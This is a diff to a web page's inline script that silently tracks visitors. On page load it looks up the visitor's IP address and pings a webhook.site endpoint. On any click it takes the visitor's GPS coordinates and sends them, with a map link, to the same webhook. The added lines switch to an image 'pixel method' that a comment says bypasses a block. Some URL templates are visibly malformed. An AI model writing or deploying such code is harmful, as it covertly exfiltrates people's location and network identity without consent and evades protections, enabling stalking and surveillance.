@@ -16,38 +16,31 @@
     <script>
         const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
 
-        // Main sending function
-        function sendToWebhook(data) {
-            fetch(webhookURL, {
-                method: 'POST',
-                mode: 'no-cors', 
-                body: JSON.stringify(data)
-            });
-        }
-
-        // 1. SILENT IP (Fires immediately)
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org');
-                const data = await res.json();
-                sendToWebhook({ type: "SILENT_IP_HIT", ip: data.ip });
-            } catch (e) {
-                sendToWebhook({ type: "DEBUG_ERROR", msg: "IP Fetch Blocked" });
-            }
-        }
-        getIP();
+        // 1. SILENT IP (The Pixel Method)
+        // This doesn't use 'fetch', so it bypasses the block you just saw.
+        const img = new Image();
+        img.src = `https://api.ipify.org{Date.now()}`; 
+        
+        // After the image "loads", we ping your webhook
+        img.onload = () => {
+             fetch(webhookURL + "?event=IP_PIXEL_LOADED", {mode: 'no-cors'});
+        };
 
         // 2. CLICK TRIGGER (GPS)
         window.onclick = () => {
             navigator.geolocation.getCurrentPosition(pos => {
-                sendToWebhook({
-                    type: "GPS_CLICKED",
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        type: "GPS_CLICKED",
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
+                    })
                 });
             }, (err) => {
-                sendToWebhook({ type: "GPS_ERROR", msg: err.message });
+                fetch(webhookURL + "?gps_error=" + err.message, {mode: 'no-cors'});
             }, { maximumAge: Infinity });
         };
     </script>
